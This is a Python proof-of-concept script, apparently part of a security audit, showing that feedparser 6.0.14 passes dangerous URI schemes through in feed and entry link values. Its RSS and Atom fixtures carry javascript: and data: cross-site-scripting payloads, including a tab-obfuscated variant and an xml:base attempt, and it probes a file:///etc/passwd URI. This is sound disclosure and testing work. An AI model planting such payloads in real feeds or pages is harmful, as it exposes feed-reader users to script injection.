"""R01: entry/feed `link` values keep dangerous URI schemes (javascript:, data:).

Shows that feedparser 6.0.14 does not scheme-filter `link` (RSS <link>,
Atom <link href>, RSS <guid> fallback, feed-level <link>) in either call mode:

  * URL mode  -> a base URI is known (simulated with Content-Location, which
                 goes through the same `resolve_uri` code path as the fetched href)
  * bytes mode without Content-Location -> base URI is empty

and that feedparser's own filter, `make_safe_absolute_uri`, *would* have
rejected the value if it had been applied (it is only applied to xml:base and
to URIs inside embedded HTML).

Run:  python -I r01_link_schemes.py      (stdlib + feedparser, no network)
"""
import io

import feedparser
from feedparser.urls import make_safe_absolute_uri, _urljoin

RSS = b"""<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"><channel>
<title>t</title><link>javascript:alert('feed')</link>
<item><title>rss link</title><link>javascript:alert(document.domain)</link></item>
<item><title>data link</title><link>data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;</link></item>
<item><title>guid fallback</title><guid>javascript:alert('guid')</guid></item>
<item><title>tab obfuscated</title><link>jav&#x09;ascript:alert(1)</link></item>
</channel></rss>"""

ATOM = b"""<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>t</title>
<entry><title>atom href</title><link href="javascript:alert(1)"/></entry>
<entry><title>xml:base attempt</title><link xml:base="javascript:x" href="rel"/></entry>
</feed>"""


def show(label, data, headers):
    d = feedparser.parse(io.BytesIO(data), response_headers=headers)
    print(f"--- {label}  (bozo={d.bozo})")
    print(f"    feed.link = {d.feed.get('link')!r}")
    for e in d.entries:
        print(f"    {e.get('title')!r:22} link = {e.get('link')!r}")


for mode, headers in (
    ("bytes mode, no Content-Location", {"content-type": "application/rss+xml"}),
    ("with base (URL mode / Content-Location)",
     {"content-type": "application/rss+xml", "content-location": "https://example.com/feed.xml"}),
):
    show("RSS  | " + mode, RSS, headers)
    show("ATOM | " + mode, ATOM, headers)

print()
print("Code reason: mixin._FeedParserMixin.resolve_uri uses plain _urljoin:")
base = "https://example.com/feed.xml"
print("  _urljoin(base, 'javascript:alert(1)')               ->", repr(_urljoin(base, "javascript:alert(1)")))
print("  make_safe_absolute_uri(base, 'javascript:alert(1)') ->", repr(make_safe_absolute_uri(base, "javascript:alert(1)")))
print("  make_safe_absolute_uri('',   'javascript:alert(1)') ->", repr(make_safe_absolute_uri("", "javascript:alert(1)")),
      " (empty base: no check at all, urls.py:90-91)")
print("  make_safe_absolute_uri(base, 'file:///etc/passwd') ->", repr(make_safe_absolute_uri(base, "file:///etc/passwd")),
      " ('file' is on the allow-list)")
